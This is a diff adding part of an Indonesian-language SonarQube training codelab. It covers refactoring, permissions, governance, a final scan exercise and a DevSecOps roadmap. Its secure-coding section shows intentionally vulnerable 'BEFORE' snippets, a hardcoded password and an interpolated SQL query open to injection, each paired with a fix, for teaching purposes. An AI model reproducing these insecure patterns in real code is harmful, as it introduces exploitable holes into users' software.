+<pre><code>Kode Lama (Legacy)     →  Biarkan, fix gradually
+Kode Baru (New Code)   →  HARUS bersih dari awal
+</code></pre>
+<h2 is-upgraded>Refactoring Techniques</h2>
+<h3 is-upgraded>1. Extract Function</h3>
+<pre><code language="language-typescript" class="language-typescript">// BEFORE: Function terlalu panjang
+function processOrder(order: any) {
+  // validasi (20 baris)
+  // hitung total (15 baris)
+  // apply discount (10 baris)
+  // simpan ke database (10 baris)
+  // kirim email (10 baris)
+}
+
+// AFTER: Dipecah
+function processOrder(order: Order) {
+  validateOrder(order);
+  const total = calculateTotal(order);
+  const finalPrice = applyDiscount(total, order.coupon);
+  await saveOrder(order, finalPrice);
+  await sendConfirmationEmail(order);
+}
+</code></pre>
+<h3 is-upgraded>2. Replace <code>any</code> with Proper Types</h3>
+<pre><code language="language-typescript" class="language-typescript">// BEFORE
+function getUser(id: any): any {
+  // ...
+}
+
+// AFTER
+interface User {
+  id: number;
+  name: string;
+  email: string;
+}
+
+function getUser(id: number): Promise&lt;User&gt; {
+  // ...
+}
+</code></pre>
+<h3 is-upgraded>3. Fix Security Issues</h3>
+<pre><code language="language-typescript" class="language-typescript">// BEFORE: Hardcoded credentials
+const DB_PASSWORD = &#34;secret123&#34;;
+
+// AFTER: Environment variables
+const DB_PASSWORD = process.env.DB_PASSWORD;
+
+// BEFORE: SQL Injection
+const query = `SELECT * FROM users WHERE id = ${id}`;
+
+// AFTER: Parameterized query
+const query = `SELECT * FROM users WHERE id = $1`;
+const result = await pool.query(query, [id]);
+</code></pre>
+<h3 is-upgraded>4. Remove Duplication</h3>
+<pre><code language="language-typescript" class="language-typescript">// BEFORE: Copy-paste code
+function calculateShipping(weight: number, zone: string) {
+  let base = weight * 2.5;
+  if (zone === &#34;domestic&#34;) return base * 1.1;
+  if (zone === &#34;international&#34;) return base * 2.5;
+  return base;
+}
+
+function calculateInsurance(weight: number, zone: string) {
+  let base = weight * 2.5;  // DUPLIKAT!
+  if (zone === &#34;domestic&#34;) return base * 0.5;
+  if (zone === &#34;international&#34;) return base * 1.2;
+  return base;
+}
+
+// AFTER: Extract common logic
+function calculateBaseRate(weight: number): number {
+  return weight * 2.5;
+}
+
+function calculateShipping(weight: number, zone: string) {
+  const base = calculateBaseRate(weight);
+  const multiplier = zone === &#34;domestic&#34; ? 1.1 : zone === &#34;international&#34; ? 2.5 : 1;
+  return base * multiplier;
+}
+</code></pre>
+<h3 is-upgraded>5. Add Error Handling</h3>
+<pre><code language="language-typescript" class="language-typescript">// BEFORE: Empty catch block
+try {
+  await saveData(data);
+} catch (e) {
+  // do nothing  ← CODE SMELL!
+}
+
+// AFTER: Proper error handling
+try {
+  await saveData(data);
+} catch (error) {
+  logger.error(&#39;Failed to save data&#39;, { error, data: data.id });
+  throw new DatabaseError(&#39;Save operation failed&#39;, { cause: error });
+}
+</code></pre>
+<h2 is-upgraded>✅ Hands-on: Fix &amp; Rescan</h2>
+<ol type="1">
+<li>Buka source code sample project</li>
+<li>Pilih <strong>3 issues</strong> dari dashboard SonarQube: <ul>
+<li>1 Bug</li>
+<li>1 Vulnerability</li>
+<li>1 Code Smell</li>
+</ul>
+</li>
+<li>Fix di code editor</li>
+<li>Scan ulang: <code>npx sonar-scanner</code></li>
+<li>Bandingkan dashboard <strong>before</strong> vs <strong>after</strong></li>
+<li>Diskusikan: apa yang berubah?</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 10 - SonarQube untuk Tim &amp; Organisasi" duration="10">
+        <h2 is-upgraded>Role &amp; Permission</h2>
+<p>SonarQube memiliki sistem permission berbasis role:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Role</p>
+</td><td colspan="1" rowspan="1"><p>Hak Akses</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Admin</strong></p>
+</td><td colspan="1" rowspan="1"><p>Full access - konfigurasi, user management</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Quality Gate Admin</strong></p>
+</td><td colspan="1" rowspan="1"><p>Manage Quality Gates</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Quality Profile Admin</strong></p>
+</td><td colspan="1" rowspan="1"><p>Manage Quality Profiles</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Project Admin</strong></p>
+</td><td colspan="1" rowspan="1"><p>Manage specific project settings</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>User</strong></p>
+</td><td colspan="1" rowspan="1"><p>Lihat hasil scan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Codeviewer</strong></p>
+</td><td colspan="1" rowspan="1"><p>Lihat source code di SonarQube</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Issue Admin</strong></p>
+</td><td colspan="1" rowspan="1"><p>Manage issues (false positive, etc.)</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Multi-Project Management</h2>
+<p>Untuk organisasi dengan banyak project:</p>
+<ol type="1">
+<li><strong>Project Tags</strong> - Kategorikan project (backend, frontend, mobile)</li>
+<li><strong>Portfolio</strong> (Enterprise) - Aggregate view dari multiple projects</li>
+<li><strong>Application</strong> (Enterprise) - Gabungkan project yang terkait</li>
+</ol>
+<h2 is-upgraded>Governance &amp; Reporting</h2>
+<p><strong>Untuk Manajemen:</strong></p>
+<ul>
+<li>Dashboard overview - semua project dalam satu halaman</li>
+<li>Trend: apakah kualitas kode <strong>membaik</strong> atau <strong>memburuk</strong>?</li>
+<li>Quality Gate status per project</li>
+<li>Biggest risk: project mana yang paling bermasalah?</li>
+</ul>
+<p><strong>Contoh Report ke Manajemen:</strong></p>
+<pre><code>=== Monthly Code Quality Report ===
+
+Total Projects: 12
+Quality Gate PASS: 9 (75%)
+Quality Gate FAIL: 3 (25%)
+
+Top Issues:
+1. Project-A: 15 vulnerabilities (CRITICAL)
+2. Project-B: Coverage dropped to 40%
+3. Project-C: 200+ new code smells
+
+Recommendation:
+- Prioritaskan fix security issues di Project-A
+- Tambah unit test di Project-B sprint depan
+- Code review lebih ketat di Project-C
+</code></pre>
+<h2 is-upgraded>Best Practice Implementasi di Organisasi</h2>
+<ol type="1">
+<li><strong>Mulai dari project baru</strong> - jangan paksa project lama langsung sempurna</li>
+<li><strong>Quality Gate bertahap</strong> - mulai longgar, ketatkan perlahan</li>
+<li><strong>Training developer</strong> - pastikan semua paham cara baca dashboard</li>
+<li><strong>Integrate ke CI/CD</strong> - enforcement otomatis</li>
+<li><strong>Regular review</strong> - weekly/monthly quality review meeting</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 11 - Final Project: Scan Project Anda Sendiri!" duration="30">
+        <h2 is-upgraded>Saatnya Praktek dengan Project Real Anda! 🚀</h2>
+<p>Sejauh ini kita sudah berlatih dengan sample project. Sekarang waktunya scan <strong>project Anda sendiri</strong> - project yang Anda kerjakan di kantor/kuliah/side project.</p>
+<h2 is-upgraded>Instruksi</h2>
+<p>Anda adalah Tech Lead di perusahaan. Management meminta Anda untuk:</p>
+<ol type="1">
+<li>Setup code quality scanning untuk project Anda</li>
+<li>Definisikan standar kualitas (Quality Gate)</li>
+<li>Presentasikan hasil &amp; rekomendasi ke tim</li>
+</ol>
+<h2 is-upgraded>Langkah-langkah</h2>
+<h3 is-upgraded>Step 1: Siapkan Project Anda (5 menit)</h3>
+<ul>
+<li>Pilih <strong>project real</strong> yang Anda miliki (TypeScript, JavaScript, Java, Python, PHP, dll)</li>
+<li>Pastikan source code ada di laptop</li>
+<li>Jika belum punya, Anda bisa fork project open-source favorit Anda</li>
+</ul>
+<aside class="special"><p> Project bahasa apapun bisa di-scan! SonarQube mendukung 30+ bahasa.</p>
+</aside>
+<h3 is-upgraded>Step 2: Setup &amp; Scan Pertama (10 menit)</h3>
+<ol type="1">
+<li>Buat project baru di SonarQube: <code>[NAMA]-real-project</code></li>
+<li>Buat <code>sonar-project.properties</code> di root project Anda:</li>
+</ol>
+<pre><code language="language-properties" class="language-properties">sonar.projectKey=[nama]-real-project
+sonar.projectName=[NAMA] Real Project
+sonar.sources=src
+sonar.host.url=http://sonar-training.duckdns.org
+sonar.token=YOUR_TOKEN
+sonar.exclusions=**/node_modules/**,**/dist/**,**/build/**
+</code></pre>
+<ol type="1" start="3">
+<li>Jalankan scan: <code>npx sonar-scanner</code></li>
+</ol>
+<h3 is-upgraded>Step 3: Analisis Hasil (5 menit)</h3>
+<ul>
+<li>Baca dashboard - catat metrik awal: <ul>
+<li>Bugs: ___</li>
+<li>Vulnerabilities: ___</li>
+<li>Code Smells: ___</li>
+<li>Coverage: ___</li>
+<li>Quality Gate: PASS / FAIL</li>
+</ul>
+</li>
+</ul>
+<h3 is-upgraded>Step 4: Fix Issues (15 menit)</h3>
+<ul>
+<li>Pilih <strong>3 issue paling kritis</strong> (minimal 1 vulnerability jika ada)</li>
+<li>Fix di code editor - perhatikan SonarQube for IDE di VS Code juga menandai issue yang sama!</li>
+<li>Scan ulang: <code>npx sonar-scanner</code></li>
+<li>Catat improvement</li>
+</ul>
+<h3 is-upgraded>Step 5: Presentasi (5 menit per peserta)</h3>
+<ul>
+<li><strong>Project apa?</strong> Bahasa apa, berapa besar?</li>
+<li><strong>Before:</strong> Metrik awal - rating, jumlah issue</li>
+<li><strong>After:</strong> Metrik setelah improvement</li>
+<li><strong>Top findings:</strong> Issue paling menarik/mengejutkan yang ditemukan</li>
+<li><strong>Rekomendasi:</strong> Apa rencana Anda untuk meningkatkan kualitas project ini?</li>
+<li><strong>Lesson learned:</strong> Apa yang Anda pelajari dari exercise ini?</li>
+</ul>
+<aside class="special"><p> Tidak ada jawaban benar atau salah - fokus pada proses dan pemahaman. Tanyakan jika Anda stuck!</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 12 - Review &amp; Rekomendasi Implementasi" duration="10">
+        <h2 is-upgraded>Checklist: Apa yang Sudah Kita Pelajari</h2>
+<ul>
+<li>✅ Code Quality &amp; Secure Coding fundamentals</li>
+<li>✅ Arsitektur &amp; komponen SonarQube</li>
+<li>✅ Instalasi &amp; konfigurasi</li>
+<li>✅ Menjalankan scan &amp; membaca hasil</li>
+<li>✅ Memahami metrik &amp; dashboard</li>
+<li>✅ Custom Quality Gate &amp; Quality Profile</li>
+<li>✅ Integrasi CI/CD (GitHub Actions)</li>
+<li>✅ Security analysis &amp; triage</li>
+<li>✅ Refactoring techniques</li>
+<li>✅ Manajemen untuk tim &amp; organisasi</li>
+</ul>
+<h2 is-upgraded>Roadmap Implementasi di Perusahaan</h2>
+<p class="image-container"><img alt="Roadmap Implementasi" src="img\\d18a8f08ee947c34.png"></p>
+<h2 is-upgraded>End-to-End DevSecOps Flow</h2>
+<p>Berikut adalah <strong>alur DevSecOps</strong> yang mengintegrasikan SonarQube ke dalam pipeline development dan security review di organisasi:</p>
+<p class="image-container"><img alt="DevSecOps Flow" src="img\\20118cc6f7926156.png"></p>
+<p><strong>Penjelasan setiap tahap:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>#</p>
+</td><td colspan="1" rowspan="1"><p>Tahap</p>
+</td><td colspan="1" rowspan="1"><p>Apa yang Terjadi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>1</p>
+</td><td colspan="1" rowspan="1"><p><strong>Developer</strong></p>
+</td><td colspan="1" rowspan="1"><p>Developer menulis kode dalam berbagai bahasa (TypeScript, Java, React Native, dll) lalu push ke GitHub</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>2</p>
+</td><td colspan="1" rowspan="1"><p><strong>Version Control</strong></p>
+</td><td colspan="1" rowspan="1"><p>GitHub menerima push/PR dan otomatis trigger CI/CD pipeline</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>3</p>
+</td><td colspan="1" rowspan="1"><p><strong>CI/CD Pipeline</strong></p>
+</td><td colspan="1" rowspan="1"><p>Jenkins mengambil source code terbaru dan menjalankan SonarScanner</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>4</p>
+</td><td colspan="1" rowspan="1"><p><strong>Security Analysis</strong></p>
+</td><td colspan="1" rowspan="1"><p>SonarQube menganalisis kode — mendeteksi bugs, vulnerabilities, code smells, dan security hotspots</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>5</p>
+</td><td colspan="1" rowspan="1"><p><strong>Notification</strong></p>
+</td><td colspan="1" rowspan="1"><p>Hasil scan dikirim melalui <strong>dua jalur</strong>: Jira ticket (untuk tracking) dan email (untuk notifikasi langsung ke assignee)</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>6</p>
+</td><td colspan="1" rowspan="1"><p><strong>Security Review</strong></p>
+</td><td colspan="1" rowspan="1"><p>Assignee dan tim Cybersecurity melakukan review meeting mingguan (contoh: setiap Selasa via Teams). Tim Cybersecurity mengirim laporan temuan balik ke developer via email</p>
+</td></tr>
+</table>
+<aside class="special"><p><strong>Mulai dari yang sederhana.</strong> Anda tidak perlu langsung implementasi semua tahap. Mulai dari <strong>tahap 1–4</strong> (Developer → GitHub → Jenkins → SonarQube), kemudian tambahkan notifikasi dan review meeting seiring waktu.</p>
+</aside>
+<aside class="warning"><p><strong>Yang sering terlewat:</strong> Banyak tim hanya setup scanning-nya saja tapi lupa membangun <strong>proses review dan feedback loop</strong> (tahap 5–6). Tanpa itu, temuan SonarQube hanya jadi data yang tidak ditindaklanjuti.</p>
+</aside>
+<h2 is-upgraded>Best Practice Summary</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Do ✅</p>
+</td><td colspan="1" rowspan="1"><p>Don&#39;t ❌</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Start with new code (&#34;Clean as You Code&#34;)</p>
+</td><td colspan="1" rowspan="1"><p>Mencoba fix semua issue legacy sekaligus</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Gradual enforcement</p>
+</td><td colspan="1" rowspan="1"><p>Langsung strict tanpa sosialisasi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Integrate ke CI/CD</p>
+</td><td colspan="1" rowspan="1"><p>Hanya scan manual</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Regular review meeting</p>
+</td><td colspan="1" rowspan="1"><p>Set &amp; forget</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Training developer</p>
+</td><td colspan="1" rowspan="1"><p>Hanya enforce tanpa edukasi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Use SonarQube for IDE di IDE</p>
+</td><td colspan="1" rowspan="1"><p>Hanya rely pada SonarQube server</p>
+</td></tr>
+</table>
+<h2 is-upgraded>DevSecOps Maturity</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Level</p>
+</td><td colspan="1" rowspan="1"><p>Deskripsi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Level 0</strong></p>
+</td><td colspan="1" rowspan="1"><p>Tidak ada scanning</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Level 1</strong></p>
+</td><td colspan="1" rowspan="1"><p>Manual scan sesekali</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Level 2</strong></p>
+</td><td colspan="1" rowspan="1"><p>Scan di CI/CD, tapi tidak blocking</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Level 3</strong></p>
+</td><td colspan="1" rowspan="1"><p>Quality Gate enforce di pipeline <strong>(BLOCKING)</strong></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Level 4</strong></p>
+</td><td colspan="1" rowspan="1"><p>Full DevSecOps - SAST + DAST + SCA + monitoring</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Next Steps untuk Anda</h2>
+<p>Gunakan <strong>Roadmap Implementasi</strong> di atas sebagai panduan bertahap:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Fase</p>
+</td><td colspan="1" rowspan="1"><p>Timeframe</p>
+</td><td colspan="1" rowspan="1"><p>Target</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Setup</strong></p>
+</td><td colspan="1" rowspan="1"><p>Bulan 1</p>
+</td><td colspan="1" rowspan="1"><p>Install SonarQube, scan 2-3 project utama, training developer, aktifkan Quality Gate &#34;Sonar Way&#34; secara soft</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Integration</strong></p>
+</td><td colspan="1" rowspan="1"><p>Bulan 2</p>
+</td><td colspan="1" rowspan="1"><p>Integrate CI/CD ke semua repo, buat Custom Quality Gate, fix critical vulnerabilities, mulai weekly quality review</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Enforcement</strong></p>
+</td><td colspan="1" rowspan="1"><p>Bulan 3</p>
+</td><td colspan="1" rowspan="1"><p>Block merge jika gate fail, aktifkan coverage requirement, monthly report ke management, pasang SonarQube for IDE di semua developer</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Maturity</strong></p>
+</td><td colspan="1" rowspan="1"><p>Bulan 6+</p>
+</td><td colspan="1" rowspan="1"><p>Full DevSecOps pipeline, portfolio tracking, company-wide coding standard, continuous improvement</p>
+</td></tr>
+</table>
+<aside class="special"><p><em>&#34;The best time to start measuring code quality was yesterday. The second best time is today.&#34;</em></p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Selamat! 🎉" duration="0">
+        <h2 is-upgraded>Anda telah menyelesaikan SonarQube Training Workshop!</h2>
+<h2 is-upgraded>Yang sudah Anda capai:</h2>
+<p>✅ Memahami konsep Code Quality &amp; Secure Coding<br> ✅ Mengerti arsitektur SonarQube<br> ✅ Berhasil melakukan scanning project<br> ✅ Bisa membaca dashboard &amp; metrik<br> ✅ Membuat custom Quality Gate<br> ✅ Mengintegrasikan SonarQube dengan CI/CD<br> ✅ Melakukan security analysis<br> ✅ Refactoring berdasarkan temuan SonarQube<br> ✅ Merencanakan implementasi di organisasi</p>
+<h2 is-upgraded>Resources</h2>
+<ul>
+<li><a href="https://docs.sonarqube.org/" target="_blank">SonarQube Documentation</a></li>
+<li><a href="https://community.sonarsource.com/" target="_blank">SonarQube Community</a></li>
+<li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a></li>
+<li><a href="https://www.sonarsource.com/solutions/clean-code/" target="_blank">Clean Code Guide</a></li>
+</ul>
+<h2 is-upgraded>Terima Kasih!</h2>
+<p>Jika ada pertanyaan setelah workshop, silakan hubungi trainer.</p>
+<p>Selamat mengimplementasikan SonarQube di organisasi Anda! 🚀</p>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+  <script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
+
+</body>
+</html>
